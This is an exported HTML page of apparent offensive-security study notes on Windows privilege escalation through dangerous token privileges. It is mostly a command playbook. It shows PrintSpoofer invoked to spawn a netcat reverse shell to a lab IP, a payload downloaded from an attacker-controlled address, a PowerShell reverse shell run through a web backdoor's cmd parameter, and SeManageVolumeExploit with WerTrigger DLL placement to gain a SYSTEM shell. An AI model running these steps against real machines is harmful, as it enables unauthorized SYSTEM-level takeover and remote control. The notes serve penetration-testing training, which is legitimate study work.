<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>14- dangerous permissions</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>14- dangerous permissions</h1><br/><p></p><p><h2>Seimpersonate token privilege</h2><ul><li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer</a><ul><li><a href="https://k4sth4.github.io/Rogue-Potato/">https://k4sth4.github.io/Rogue-Potato/</a></li></ul></li><li></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">wget</span> https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe<br />iwr -uri http://192.168.45.232/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe<br />.<span style="color:#333333;font-weight:400">\P</span>rintSpoofer64.exe -i -c powershell.exe<br /><br />.<span style="color:#333333;font-weight:400">\P</span>rintSpoofer.exe -c <span style="color:#3ad900;font-weight:400">&quot;c:\Temp\nc.exe 192.168.45.230 4444 -e cmd&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># sometime it is better to do it from the backdoor </span><br />?cmd=C:<span style="color:#333333;font-weight:400">\t</span>emp<span style="color:#333333;font-weight:400">\P</span>rintSpoofer64.exe -c <span style="color:#3ad900;font-weight:400">&quot;cmd /c powershell -c C:/temp/rev.ps1&quot;</span></pre></div></p><p></p><p></p><p><h2>SeManageVolume EXploit</h2></p><p><ul><li></li></ul><div class="codebox"><pre>.<span style="color:#ff9d00;font-weight:700">/</span>SeManageVolumeExploit.exe<br /><span style="color:#0088ff;font-weight:400">### We upload SeManageVolumeExploit.exe to the target and execute it. After execution, we discover that the Builtin Users group has full permissions on the Windows folder.</span><br />icacls C:/Windows <br /><span style="color:#0088ff;font-weight:400">## Let&#39;s use WerTrigger from https://github.com/sailay1996/WerTrigger to acquire a SYSTEM shell.</span><br />Copy phoneinfo.dll to *C:<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\S</span>ystem32*<br />Place Report.wer file and WerTrigger.exe in a same directory.<br />Run WerTrigger.exe.<br /><br /><span style="color:#0088ff;font-weight:400">## or exploit runing service by replacing dll </span><br /><br /><span style="color:#0088ff;font-weight:400">## execute </span><br />.<span style="color:#333333;font-weight:400">\n</span>c.exe 192.168.118.23 4444 -e cmd.exe</pre></div></p></div>
</body>
</html>
